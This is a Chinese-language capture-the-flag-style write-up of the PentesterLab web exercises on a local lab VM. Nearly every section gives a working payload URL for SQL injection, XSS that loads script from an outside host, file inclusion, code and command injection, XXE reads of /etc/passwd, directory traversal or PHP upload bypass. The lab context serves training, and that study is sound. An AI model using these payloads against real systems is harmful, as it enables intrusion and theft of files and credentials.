title: Pentester Lab Writeup
date: 2016-03-21 10:16:46
tags: pentest
---
> 玩了下exploit, 再来玩玩pentest。

<!--more-->

# SQLI
## Example 1
没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。
Payload:
```
http://192.168.56.102/sqli/example1.php?name=admin%27%20union%20select%20version(),load_file(%22/etc/passwd%22),user(),4,5%23
```

## Example 2
这题就过滤了空格呗。。也简单。。  
```
http://192.168.56.102/sqli/example2.php?name=root%27/**/union/**/select/**/version(),user(),database(),4,5%23
http://192.168.56.102/sqli/example2.php?name=root%27/**/union/**/select/**/SCHEMA_NAME,user(),database(),4,5/**/from/**/information_schema.SCHEMATA%23
http://192.168.56.102/sqli/example2.php?name=root%27/**/union/**/select/**/TABLE_NAME,user(),database(),4,5/**/from/**/information_schema.TABLES/**/where/**/table_schema=%22exercises%22%23
```

## Example 3

只能说上题的payload还能用。
```
http://192.168.56.102/sqli/example3.php?name=root%27/**/union/**/select/**/user(),database(),version(),4,5%23
```

去看看源码。。看看这两题的过滤有啥区别。。
```
//example2.php
if (preg_match('/ /', $_GET["name"])) {
		die("ERROR NO SPACE");	
}
//example3.php
if (preg_match('/\s+/', $_GET["name"])) {
		die("ERROR NO SPACE");	
	}
```

这过滤对我的payload并没有影响。。

## Example 4

换整型注入了。。一样。。
Payload:
```
http://192.168.56.102/sqli/example4.php?id=2%20union%20select%20user(),version(),database(),4,5%23
```

## Example 5

上题的payload还是可以用，这题的过滤是要求0-9开头
```
http://192.168.56.102/sqli/example5.php?id=2%20union%20select%20user(),version(),database(),5,6%23
```

## Example 6

猜到了，这题是要求0-9结尾。。一样简单
```
http://192.168.56.102/sqli/example6.php?id=2%20union%20select%20user(),version(),database(),4,5%233
```

## Example 7

这题看了源码。
Payload:
```
http://192.168.56.102/sqli/example7.php?id=2%0aunion%20select%20version(),user(),database(),4,5%23
```

这题需要用%0a来bypass，因为。。看源码：  
```
if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
		die("ERROR INTEGER REQUIRED");	
	}
```

主要是最后的/m

> m (PCRE_MULTILINE)
> 默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， "行首"元字符 (^) 仅匹配字符串的开始位置， 而"行末"元字符 (\$) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 "\n" 字符，或者模式中没有出现 ^ 或 \$，设置这个修饰符不产生任何影响。


意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true

## Example 8

很明显，是在`order by`的位置注，不过就不能使用union了，所以用布尔盲注。。
```
http://192.168.56.102/sqli/example8.php?order=id`,(select%20ascii(substr(user(), [var1],1))=[var2])%23
```

写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。

以前写过这样的脚本，现在就懒得写了。。

## Example 9

和前面一个比，就是少了一个\`， 其他都一样
```
http://192.168.56.102/sqli/example8.php?order=id, (select%20ascii(substr(user(), [var1],1))=[var2])%23
```

# XSS
## Example 1

很简单，没做过过滤的xss
```
http://192.168.56.102/xss/example1.php?name=hacker%3Cscript%20src=%22http://xxx.xxx.xxx/template/alert.js%22%3E%3C/script%3E
```
成功弹窗

## Example 2

变个大小写就好了
```
http://192.168.56.102/xss/example2.php?name=hacker%3Cscript%20src=%22http://xxx/template/alert.js%22%3E%3C/scriPT%3E
```

## Example 3

价格空格就好了
```
http://192.168.56.102/xss/example3.php?name=hacker%3CscripT%20src=%22http://xxx/template/alert.js%22%3E%3C/Script%20%3E
```

## Example 4

过滤了script，而且不是去掉而是出现了就直接报错，不过任然可以日。
payload: 
```
http://192.168.56.102/xss/example4.php?name=hacker%3Csvg/onload=%22var%20i=String.fromCharCode(115,%2099,%20114,%20105,%20112,%20116);s%20=%20createElement(i);body.appendChild(s);s.src=%27http://xxx/template/alert.js%27;%22
```

## Example 5

过滤的是alert，可惜我都不是直接用alert, 改个文件名就好了
```
http://192.168.56.102/xss/example5.php?name=hacker%3Cscript%20src=%22http://xxx/myjs/test.js%22%3E%3C/script%3E
```

## Example 6

这回代码是插在`<script>`里面, 没做啥过滤
payload:
```
http://192.168.56.102/xss/example6.php?name=script";s=document.createElement($a);s.src="http://xxx/template/alert.js";document.getElementsByTagName( "head" )[0].appendChild(s);//
```

## Exmple 7

...过滤了双引号。。不过和上题有差？
```
http://192.168.56.102/xss/example7.php?name=script';s=document.createElement($a);s.src='http://xxx/template/alert.js';document.getElementsByTagName( 'head')[0].appendChild(s);//
```

## Example 8

这题改成POST了，然后直接输出，把尖括号编码了。。能艹？上次SSCTF也有类似的题，可是是通过框架来日。。所以看了下源码。。
```
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
```

好了，有了这句就能艹了。。原来不是用POST

payload:
```
http://192.168.56.102/xss/example8.php/"><script src=http://xxx/template/alert.js></script>
```

## Example 9

这题貌似看浏览器啊。。用firefox会自动帮你urlencode，用chrome成功了。。
```
http://192.168.56.102/xss/example9.php#<script src=http://xss.lazysheep.cc/template/alert.js></script>
```

# File Include
## Example 1

很简单。。没做任何过滤
```
http://192.168.56.102/fileincl/example1.php?page=/../../../../etc/passwd
```

## Example 2

也简单，就是会在名字后面自动加上`.php`，用%00可以bypass
```
http://192.168.56.102/fileincl/example2.php?page=/etc/passwd%00
```

# Code injection

## Example 1

入门的代码执行漏洞。。没做任何过滤。。
payload:
```
http://192.168.56.102/codeexec/example1.php?name=%22;system(%27cat%20/etc/passwd%27);//
```

## Example 2

这题也不难，搜索一下`php create_function 代码注入`，我来分析下。。源码如下
```
usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
```

然后系统会拼凑一个函数：
```
function __lambda_func($a, $b)
{
    return strcmp($a->$order, $b-> $order); }
```

然后会使用eval函数，看到这里就好了。。
Payload：
```
http://192.168.56.102/codeexec/example2.php?order=id,$b-%3Ename);}phpinfo();//
```

这样拼凑的函数就成了
```
function __lambda_func($a,$b)
{
    return strcmp($a->id, $b->name);}phpinfo();//);}
```

## Example 3

这题随便试下报错发现用了preg_replace，然后又是代码注入的题，自然想到了`\e`修饰符
Payload:
```
http://192.168.56.101/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=lamer
```

## Example 4

`assert`的命令执行，跟`eval`用法类似，不过黑盒了半天都有问题。白盒了后
Payload: 
```
http://192.168.56.101/codeexec/example4.php?name=%27.phpinfo();//
```

# Commands injecttion

## Example 1

没做任何过滤的。。。直接就可以输入命令了。。
```
http://192.168.56.101/commandexec/example1.php?ip=;ls
```

## Example 2

这种遇到的少了，还是白盒了，然后发现`preg_match`的正则有\m修饰符，就会了。。。
```
http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0als
```

## Example 3

这题还不错。。受到前几题的影响，一直在想正则怎么绕了，研究了半天，发现正则写的没问题，根本绕过不
```
preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $_GET['ip'])
```

看了LL的wp后在注意到，header后竟然没有exit，这就跟没过滤一样了，这类的题目以前遇到过。。
Payload:
```
$ curl -v "http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1;ls"
```

# XML attacks

这部分是XXE注入，XML Entity Injection, XML不是特别了解，参考文档<https://www.91ri.org/9539.html>

## Example 1
根据文档中的例子，自己试了试，把能删的都删了，剩下必须的部分：
```
http://192.168.56.101/xml/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E
<!DOCTYPE h [<!ENTITY pen SYSTEM "file:///etc/passwd" >]><text>&pen;</text>
http://192.168.56.101/xml/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22php%3A%2f%2ffilter%2fread%3Dconvert.base64-encode%2fresource%3Dexample1.php%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E
<!DOCTYPE h [<!ENTITY pen SYSTEM "php://filter/read=convert.base64-encode/resource=example1.php" >]><text>&pen;</text>
http://192.168.56.101/xml/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22http:/%2f127.0.0.1%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E
<!DOCTYPE h [<!ENTITY pen SYSTEM "http://127.0.0.1" >]><text>&pen;</text>
```

SYSTEM之后的参数可以如下协议：
```
file://
http://
php://
```

## Example 2

这个是XML Injection，以前做过，也写过wp，<http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100>
Payload:
```
http://192.168.56.101/xml/example2.php?name=hacker%27%5D%20%7C%20%2f%2f%2a%7C%20%2f%2f%2a%5B%27
```

# Directory traversal

## Example 1

打开来看啥也没有。。不明所以，看了下源码，是没做任何过滤的任意文件读取，，
Payload:
```
http://192.168.56.101/dirtrav/example1.php?file=../../../../etc/passwd
```

## Example 2

也不难。。。几乎也跟没过滤一样
```
http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd
```

## Example 3

这题的这正则有跟没有一样。。。不能匹配到结尾的`\x00`
Payload:
```
http://192.168.56.101/dirtrav/example3.php?file=../../../etc/passwd%00
```

# File Upload

## Example 1

同样是没做过滤。。。
```
$ echo "<?php phpinfo();?>" > /tmp/test.php
```

把 `/tmp/test.php` 上传上去，然后可以直接访问。。同样可以写一句话getshell

## Example 2

这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行